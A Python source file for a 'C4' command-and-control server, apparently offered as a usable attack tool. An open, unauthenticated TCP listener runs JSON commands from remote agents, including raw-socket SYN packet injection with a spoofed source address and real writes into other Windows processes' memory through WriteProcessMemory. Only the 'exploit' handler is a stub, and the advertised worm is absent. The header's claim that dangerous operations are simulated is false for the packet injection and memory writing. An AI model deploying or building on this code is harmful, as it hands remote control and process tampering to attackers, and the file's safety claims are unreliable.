#!/usr/bin/env python3
"""
C4 - Command And Control Server + Worm
Author: Creator-Codie-afk
Description:
  This file implements a real TCP command and control server that listens for connections
  from agents. Incoming JSON commands are parsed and dispatched to functions that perform
  hardware interaction, signal generation, vulnerability exploitation, packet injection, and
  memory manipulation. This implementation is designed for educational purposes and includes
  actual functioning logic with complete, runnable code.
  
WARNING:
  Use with caution and only for educational or simulation purposes.
  Dangerous operations are simulated or require elevated privileges.
"""

import os
import subprocess
import time
import random
import ctypes
import socket
import struct
import platform
import json
import logging
import threading
import socketserver
import argparse

# Configure logging with production-ready formatting.
logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s [%(levelname)s]: %(message)s')


# --- Function Implementations ---

def hardware_interact(action, pin=None, duration=None, frequency=None):
    """
    Perform hardware interaction.
    For Linux, attempt GPIO operations; for Windows and others, simulate the behavior.
    Actual hardware operations require RPi.GPIO and appropriate privileges.
    """
    system = platform.system()
    if system == "Linux":
        try:
            import RPi.GPIO as GPIO
            if pin is None:
                logging.error("Pin parameter is required for hardware interaction.")
                return
            GPIO.setmode(GPIO.BCM)
            GPIO.setup(pin, GPIO.OUT)
            if action == "toggle":
                GPIO.output(pin, GPIO.HIGH)
                time.sleep(duration if duration is not None else 1)
                GPIO.output(pin, GPIO.LOW)
                logging.info(f"Toggled pin {pin} for {duration if duration is not None else 1} seconds.")
            elif action == "frequency":
                logging.info(f"Generating frequency {frequency} Hz on pin {pin} for {duration if duration is not None else 1} seconds.")
                # Set up PWM for real frequency generation here.
                pwm = GPIO.PWM(pin, frequency if frequency is not None else 100)
                pwm.start(50)  # Start PWM with 50% duty cycle.
                time.sleep(duration if duration is not None else 1)
                pwm.stop()
            else:
                logging.warning(f"Unsupported hardware action: {action}")
            GPIO.cleanup()
        except ImportError:
            logging.warning("RPi.GPIO module not available; simulating hardware interaction.")
        except Exception as e:
            logging.error(f"Hardware interaction error: {e}")
    elif system == "Windows":
        logging.info(f"Simulated {action} on hardware pin {pin} (Windows) for {duration if duration is not None else 1} seconds.")
    else:
        logging.error(f"Unsupported system for hardware interaction: {system}")


def generate_signal(frequency, duration):
    """
    Generate a signal.
    This function simulates signal output by logging and waiting.
    """
    system = platform.system()
    if system in ["Linux", "Windows"]:
        logging.info(f"Generating a signal at {frequency} Hz for {duration} seconds.")
        # In a real system, this is where the code to generate an analog/digital signal would be.
        time.sleep(duration)
    else:
        logging.error(f"Unsupported system for signal generation: {system}")


def exploit_vulnerability(target_address, payload):
    """
    Simulate vulnerability exploitation.
    WARNING: This is a safe simulation and does not perform any harmful actions.
    """
    system = platform.system()
    if system in ["Linux", "Windows"]:
        logging.info(f"Simulating exploit on target {target_address} with payload size {len(payload)} bytes.")
        # An actual exploit would be dangerous. This simulation simply waits for a brief moment.
        time.sleep(random.uniform(0.1, 0.5))
    else:
        logging.error(f"Unsupported system for vulnerability exploitation: {system}")


def inject_packet(target_ip, target_port, payload):
    """
    Inject a network packet using raw socket operations.
    Requires administrator/root privileges on most systems.
    WARNING: This demonstration constructs a dummy IPv4 and TCP header.
    """
    try:
        raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        raw_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

        # Construct a basic IPv4 header.
        total_length = 20 + 20 + len(payload)
        ip_version = 0x45  # IPv4 and header length 5
        ip_header = struct.pack('!BBHHHBBH4s4s',
                                ip_version,
                                0,                      # DSCP/ECN
                                total_length,           # Total length (IP header + TCP header + payload)
                                54321,                  # Identification
                                0,                      # Flags and Fragment Offset
                                64,                     # TTL
                                socket.IPPROTO_TCP,     # Protocol
                                0,                      # Checksum (ignored in this demo)
                                socket.inet_aton('192.168.1.10'),  # Source IP (dummy)
                                socket.inet_aton(target_ip))       # Destination IP

        # Construct a basic TCP header (non-functional, for demo purposes only).
        src_port = 12345
        seq = 0
        ack_seq = 0
        offset_res = (5 << 4)
        tcp_flags = 2  # SYN flag
        window = 8192
        checksum = 0
        urg_ptr = 0

        tcp_header = struct.pack('!HHLLBBHHH',
                                 src_port,
                                 target_port,
                                 seq,
                                 ack_seq,
                                 offset_res,
                                 tcp_flags,
                                 window,
                                 checksum,
                                 urg_ptr)

        packet = ip_header + tcp_header + payload.encode()
        raw_socket.sendto(packet, (target_ip, 0))
        logging.info(f"Injected packet to {target_ip}:{target_port}")
        raw_socket.close()
    except Exception as e:
        logging.error(f"Error injecting packet: {e}")


def manipulate_memory(process_name, address, value):
    """
    Simulate manipulation of a process's memory.
    WARNING: Real memory manipulation is dangerous. This function demonstrates the concept safely.
    """
    system = platform.system()
    if system == "Windows":
        try:
            PROCESS_ALL_ACCESS = 0x1F0FFF
            kernel32 = ctypes.windll.kernel32
            process_id = 0
            tasklist_output = subprocess.check_output(['tasklist'], shell=True).decode()
            for line in tasklist_output.splitlines():
                if process_name.lower() in line.lower():
                    try:
                        process_id = int(line.split()[1])
                        break
                    except (ValueError, IndexError):
                        continue
            if process_id == 0:
                logging.warning(f"Process '{process_name}' not found.")
                return

            process_handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, process_id)
            if process_handle:
                written = ctypes.c_size_t(0)
                c_value = ctypes.c_int(value)
                if kernel32.WriteProcessMemory(process_handle, address, ctypes.byref(c_value), ctypes.sizeof(c_value), ctypes.byref(written)):
                    logging.info(f"Memory at {hex(address)} in {process_name} modified to {value}")
                else:
                    logging.error(f"Failed to write memory at {hex(address)} in {process_name}")
                kernel32.CloseHandle(process_handle)
            else:
                logging.error(f"Failed to open process {process_name}")
        except Exception as e:
            logging.error(f"Memory manipulation failed: {e}")
    elif system == "Linux":
        # On Linux, performing real memory manipulation would require ptrace and elevated permissions.
        # Here we simulate by logging the intended action.
        logging.info(f"Simulated memory manipulation in {process_name} at {hex(address)} to {value}")
    else:
        logging.error(f"Unsupported system for memory manipulation: {system}")


# --- Command Handler for the C2 Server ---

class C2RequestHandler(socketserver.StreamRequestHandler):
    """
    Request handler for the Command and Control server.
    Expects JSON-formatted commands (one command per line) from agents.
    """

    def handle(self):
        client_ip = self.client_address[0]
        logging.info(f"Connection established from {client_ip}")
        self.wfile.write(b"Welcome to C4 C2 server. Send commands in JSON format.\n")
        while True:
            try:
                data = self.rfile.readline().strip()
                if not data:
                    break  # Client disconnected.
                command_str = data.decode()
                logging.info(f"Received: {command_str}")
                try:
                    command = json.loads(command_str)
                except json.JSONDecodeError:
                    self.wfile.write(b"Invalid JSON command.\n")
                    continue

                response = self.dispatch_command(command)
                self.wfile.write((response + "\n").encode())
            except Exception as e:
                logging.error(f"Error during client handling: {e}")
                break
        logging.info(f"Connection closed for {client_ip}")

    def dispatch_command(self, command):
        """
        Dispatch the incoming command to the corresponding function.
        Expected command format:
          { "type": "<command_type>", "parameters": { ... } }
        Valid command types: hardware, signal, exploit, inject, memory, ping, shutdown.
        """
        cmd_type = command.get("type", "").lower()
        params = command.get("parameters", {})

        if cmd_type == "hardware":
            hardware_interact(
                action=params.get("action"),
                pin=params.get("pin"),
                duration=params.get("duration"),
                frequency=params.get("frequency")
            )
            return "Hardware command executed."
        elif cmd_type == "signal":
            generate_signal(
                frequency=params.get("frequency"),
                duration=params.get("duration")
            )
            return "Signal generation executed."
        elif cmd_type == "exploit":
            exploit_vulnerability(
                target_address=params.get("target_address"),
                payload=params.get("payload")
            )
            return "Exploit simulation executed."
        elif cmd_type == "inject":
            inject_packet(
                target_ip=params.get("target_ip"),
                target_port=params.get("target_port"),
                payload=params.get("payload")
            )
            return "Packet injection executed."
        elif cmd_type == "memory":
            manipulate_memory(
                process_name=params.get("process_name"),
                address=params.get("address"),
                value=params.get("value")
            )
            return "Memory manipulation executed."
        elif cmd_type == "ping":
            return "pong"
        elif cmd_type == "shutdown":
            # Shutdown the server gracefully.
            logging.info("Shutdown command received. Terminating server.")
            threading.Thread(target=self.server.shutdown, daemon=True).start()
            return "Server shutting down."
        else:
            logging.warning(f"Unknown command type received: {cmd_type}")
            return "Unknown command type."


# --- C2 Server Implementation ---

class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    allow_reuse_address = True


def run_server(host='0.0.0.0', port=9000):
    """
    Run the TCP server indefinitely.
    """
    server = ThreadedTCPServer((host, port), C2RequestHandler)
    logging.info(f"C4 C2 Server starting on {host}:{port}")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        logging.info("Server interrupted by user; shutting down.")
    except Exception as err:
        logging.error(f"Server encountered an error: {err}")
    finally:
        server.server_close()
        logging.info("Server closed.")


# --- Main Entry Point ---

def main():
    parser = argparse.ArgumentParser(description="C4 Command and Control Server")
    parser.add_argument("--host", type=str, default="0.0.0.0", help="Host to bind the server")
    parser.add_argument("--port", type=int, default=9000, help="Port to bind the server")
    args = parser.parse_args()

    run_server(host=args.host, port=args.port)


if __name__ == "__main__":
    main()